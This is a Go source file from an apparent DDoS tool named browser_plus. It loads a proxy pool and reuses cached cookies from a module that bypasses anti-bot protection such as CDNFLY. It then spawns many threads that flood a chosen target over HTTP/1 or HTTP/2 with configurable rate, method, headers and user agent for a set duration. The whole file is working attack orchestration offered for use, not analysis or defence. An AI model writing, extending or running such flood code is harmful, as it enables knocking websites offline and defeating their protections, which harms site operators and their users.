package app

import (
	"fmt"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"browser_plus/browser_core/flooder"
	"browser_plus/browser_core/internal/bypass"
	"browser_plus/browser_core/internal/config"
)

type App struct {
	cfg          *config.Config
	proxyPool    []string
	stats        map[int]int
	stopCh       chan struct{}
	wg           sync.WaitGroup
	cookieCache  *bypass.CookieCache
}

func Run(cfg *config.Config) error {
	if err := bypass.EnsureApi(); err != nil {
		fmt.Fprintln(os.Stderr, err)
	}
	app := &App{
		cfg:     cfg,
		stats:   make(map[int]int),
		stopCh:  make(chan struct{}),
	}
	if err := app.init(); err != nil {
		return err
	}
	app.run()
	return nil
}

func (a *App) init() error {
	a.setupSignalHandlers()
	proxies, err := a.loadProxyPool()
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
	} else {
		a.proxyPool = proxies
	}
	cc, err := bypass.OpenCookieCache(a.cacheDir())
	if err != nil {
		fmt.Fprintf(os.Stderr, "Cookie 缓存初始化失败: %v\n", err)
	} else {
		a.cookieCache = cc
	}
	return nil
}

func (a *App) cacheDir() string {
	if v := os.Getenv("BROWSER_BYPASS_CACHE_DIR"); v != "" {
		return v
	}
	home, err := os.UserHomeDir()
	if err == nil {
		return home + "/.browser_bypass"
	}
	return os.TempDir() + "/.browser_bypass"
}

func (a *App) setupSignalHandlers() {
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-ch
		close(a.stopCh)
		flooder.KillAll()
		os.Exit(0)
	}()
}

func (a *App) loadProxyPool() ([]string, error) {
	if a.cfg.ProxyFile == "" || a.cfg.ProxyFile == "/dev/null" {
		return nil, fmt.Errorf("本地 proxy 文件无可用条目")
	}
	data, err := os.ReadFile(a.cfg.ProxyFile)
	if err != nil {
		return nil, err
	}
	var pool []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		pool = append(pool, line)
	}
	if len(pool) == 0 {
		return nil, fmt.Errorf("本地 proxy 文件无可用条目")
	}
	return pool, nil
}

func (a *App) run() {
	provider := bypass.NormalizeProvider(a.cfg.BypassType)
	if provider == string(bypass.ProviderAuto) {
		provider = a.resolveAutoProvider()
	}
	a.startFloodOnlyMode(provider)
}

func (a *App) resolveAutoProvider() string {
	target := a.cfg.Target
	resp := bypass.ClassifyTarget(target)
	return resp
}

func (a *App) startFloodOnlyMode(provider string) {
	protocol := a.applyDefaultProtocol(provider)
	threads := a.cfg.Threads
	if threads < 1 {
		threads = 1
	}
	for i := 0; i < threads; i++ {
		proxy := ""
		if len(a.proxyPool) > 0 {
			proxy = a.proxyPool[i%len(a.proxyPool)]
		}
		a.wg.Add(1)
		go func(p string) {
			defer a.wg.Done()
			a.launchFloodOne(protocol, p)
		}(proxy)
	}
	done := time.After(time.Duration(a.cfg.RunDur) * time.Second)
	<-done
	close(a.stopCh)
	flooder.KillAll()
	a.wg.Wait()
	fmt.Fprintf(os.Stderr, "Duration %ds reached, exiting...\n", a.cfg.RunDur)
}

func (a *App) applyDefaultProtocol(provider string) string {
	p := strings.ToLower(a.cfg.Protocol)
	if p == "h1" || p == "h2" {
		return p
	}
	if provider == string(bypass.ProviderCDNFLY) {
		return "h1"
	}
	return "h2"
}

func (a *App) launchFloodOne(protocol, proxy string) {
	cookies := ""
	if a.cookieCache != nil {
		t := a.cookieCache.Get(a.cfg.Target)
		if t.PassCookie != "" {
			cookies = t.PassCookie
		}
	}
	cmd, err := flooder.StartFlooder(
		protocol,
		a.cfg.Target,
		strings.ToUpper(a.cfg.Method),
		a.cfg.Referer,
		a.cfg.UA,
		proxy,
		a.cfg.Data,
		a.cfg.Headers,
		a.cfg.HostIPs,
		a.cfg.RateReset,
		boolToStr(a.cfg.DropProxy),
		a.cfg.Pattern,
		a.cfg.Rate,
		a.cfg.ProxyDur,
		cookies,
	)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		return
	}
	_ = cmd
}

func boolToStr(b bool) string {
	if b {
		return "on"
	}
	return "off"
}
